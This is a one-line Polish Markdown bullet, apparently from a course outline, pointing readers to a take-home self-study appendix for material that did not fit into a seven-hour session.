    - Wskaż [dodatek do samodzielnej nauki](./appendix_take_home-pl.md) z tym, czego nie dało się zmieścić w 7 godzinach.
